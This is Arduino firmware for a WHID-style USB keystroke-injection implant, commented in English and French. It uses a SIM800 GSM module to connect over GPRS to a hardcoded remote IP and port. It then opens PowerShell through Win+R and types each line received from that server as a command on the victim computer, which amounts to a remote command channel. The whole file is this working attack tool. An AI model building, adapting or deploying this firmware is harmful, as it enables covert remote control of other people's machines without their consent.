// This firmware is only for keyboard injection. The WHID will connect to the Ip Hardcoded in the code, open a powershell and just write data 
// received via TCP on it. It is just keystroke injection there is no feedback. 
HardwareSerial *fonaSerial = &Serial1; //Le fona is linked via the GPIO 0 and 1. It represent the Serial1
Adafruit_FONA fona = Adafruit_FONA(FONA_RST);

void typeKey(uint8_t key) { //Defining a pressKey function  
  KeyboardAzertyFr.press(key);
  delay(50);
  KeyboardAzertyFr.release(key);
}



void setup()
{ 
  KeyboardAzertyFr.begin();
  Serial.begin(230400);// initialisation des liaison séries (liaison de debug) 
  SerialUSB.begin (230400); // initialisation de la liaison avec l'ordinateur
  fonaSerial->begin(115200);//Initialisationde la liaison avec le FONA 
  if (! fona.begin(*fonaSerial)) { // début de la communication avec le FONA
    Serial.println(F("NO SIM800!"));
    while (1);
  }
  while(true){
    int i = fona.getNumSMS(); //recupération du nombre de SMS
    Serial.print(F("Number of SMS: "));
    Serial.println(i);
    if(i != -1){
      Serial.println(F("\n\rDeleting SMS...")); 
      delay(500);
      if(fona.sendCheckReply(F("AT+CMGDA=\"DEL ALL\"\r\n"), F("OK"), 100)){ //effacement des sms en mémoire 
        break;
      }
    }
    if(i==0) break;
    delay(500);
  }
  fona.sendCheckReply(F("AT+CIPMODE=1"),F("OK"),100);

  fona.setGPRSNetworkSettings(F("orange"), F("orange"), F("orange"));//configuration de l'APN (nom, utilisateur, mot de passe)
         
  if (!fona.enableGPRS(true)) //activation du GPRS
    Serial.println(F("Failed to turn on"));
 fona.sendCheckReply(F("AT+CGATT?"),F("OK"),100);// vérification de l'état du GPRS
  
 fona.sendCheckReply(F("AT+CIICR"),F("OK"),100);// 

 fona.sendCheckReply(F("AT+CIFSR"),F("OK"),100);// récupération de l'adresse ip locale de la carte
 
 delay(100);
 //####################################################### ENTER YOUR IP ADDRESS AND ITS PORT HERE!###################################
 //#                                                                                                                                 #
 //###################################################################################################################################
 if(!fona.sendCheckReply("AT+CIPSTART=\"TCP\",\"<IP>\",\"<PORT>\"",F("OK"),100))// connection au Serveur distant 
    while(1);

// Opening a powershell windows 
   KeyboardAzertyFr.press(KEY_LEFT_GUI);
   delay(50);
   KeyboardAzertyFr.press((char) 114); //In Decimal, is r
   KeyboardAzertyFr.releaseAll();
   delay(1000);
   KeyboardAzertyFr.print("powershell"); // ouverture powershell 
   typeKey(KEY_RETURN);
   delay(1000);
}

void loop()
{
  if (fonaSerial->available()) //si données dispo sur liaison fona/carte
   {
    
    Serial.print("reçu");
    delay( 1000);  
    String d=fonaSerial->readStringUntil('\n'); // lecture des données 
    Serial.print(d);
    char v[d.length()];// conversion de string en char[]
    strcpy(v, d.c_str());
    KeyboardAzertyFr.print(v); // ecriture des données sur la liaison série de l'ordinateur 
    typeKey(KEY_RETURN);

 
   }
   
  
}
